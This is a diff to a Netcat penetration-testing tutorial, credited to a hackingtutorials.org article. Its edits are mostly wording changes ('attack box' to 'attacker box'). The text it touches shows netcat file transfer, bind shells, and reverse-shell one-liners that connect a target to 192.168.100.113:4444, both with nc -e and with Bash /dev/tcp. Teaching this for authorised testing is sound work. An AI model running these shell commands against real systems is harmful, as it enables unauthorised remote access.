@@ -36,12 +36,12 @@ GET / HTTP/1.0
 ```
 #### File transfers with Netcat
 
-In this example we will be using a Netcat connection to transfer a text file. Let’s assume we have remote command execution on the target host and we want to transfer a file from the attack box to the host. First we would need to set up a listener on the target host and connect to it from the attack box. We will be using port 8080 for this purpose and we safe the file to the desktop:
+In this example we will be using a Netcat connection to transfer a text file. Let’s assume we have remote command execution on the target host and we want to transfer a file from the attacker box to the host. First we would need to set up a listener on the target host and connect to it from the attacker box. We will be using port 8080 for this purpose and we safe the file to the desktop:
 
 ```
 $ nc -lvp 8080 > /root/Desktop/transfer.txt
 ```
-On the attack box(our machine) we connect to port 8080 and send a file name transfer.txt:
+On the attacker box(our machine) we connect to port 8080 and send a file name transfer.txt:
 
 ```
 $ nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
@@ -49,7 +49,7 @@ $ nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
 
 ### Netcat reverse shells
 
-A very popular usage of Netcat and probably the most common use from penetration testing perspective are reverse shells and bind shells. A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell. A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attack box. In malicious software a bind shell is often revered to as a backdoor.
+A very popular usage of Netcat and probably the most common use from penetration testing perspective are reverse shells and bind shells. A reverse shell is a shell initiated from the target host back to the attacker box which is in a listening state to pick up the shell. A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attacker box. In malicious software a bind shell is often revered to as a backdoor.
 
 In the following paragraphs we will be demonstrating the use of bind and reverse shell. We will be using port 4444 throughout this tutorial but please note that this can be any open port instead. In fact, often you need to use more common ports like 80 and 443 to setup reverse shells as it is more common for these ports to be open.
 
@@ -62,17 +62,17 @@ In order to setup a Netcat reverse shell we need to follow the following steps:
 
 1. Setup a Netcat listener.
 2. Connect to the Netcat listener from the target host.
-3. Issue commands on the target host from the attack box.
+3. Issue commands on the target host from the attacker box.
 
 
-First we setup a Netcat listener on the attack box which is listening on port 4444 with the following command:
+First we setup a Netcat listener on the attacker box which is listening on port 4444 with the following command:
 
 ```
 $ nc –lvp 4444
 
 ```
 
-Than we issue the following command on the target host to connect to our attack box (remember we have remote code execution on this box):
+Than we issue the following command on the target host to connect to our attacker box (remember we have remote code execution on this box):
 
 ```
 $ nc 192.168.100.113 4444 –e /bin/bash
@@ -86,11 +86,11 @@ nc.exe 192.168.100.113 4444 –e cmd.exe
 
 #### Reverse shell without Netcat on the target host
 
-One major downside on the shown example is that you need Netcat on that target host which is very often not the case in real world scenario’s. In some cases Netcat is present, or we have a way to install it, but in many cases we need to use alternatives ways to connect back to the attack box. Let’s have a look at a few alternative ways to setup a reverse shell.
+One major downside on the shown example is that you need Netcat on that target host which is very often not the case in real world scenario’s. In some cases Netcat is present, or we have a way to install it, but in many cases we need to use alternatives ways to connect back to the attacker box. Let’s have a look at a few alternative ways to setup a reverse shell.
 
 ##### Bash reverse shell
 
-With can also use Bash to initiate a reverse shell from the target host to the attack box by using the following command:
+With can also use Bash to initiate a reverse shell from the target host to the attacker box by using the following command:
 
 ```
 $ bash -i >& /dev/tcp/192.168.100.113/4444 0>&1
@@ -128,5 +128,12 @@ In this visualization the target binds a Bash shell to port 4444 using a Netcat 
 
 
 1. Bind a bash shell to port 4444 using Netcat.
-2. Connect to the target host on port 4444 from the attack box.
-3. Issue commands on the target host from the attack box.
+2. Connect to the target host on port 4444 from the attacker box.
+3. Issue commands on the target host from the attacker box.
+
+
+
+
+### sources
+
+https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
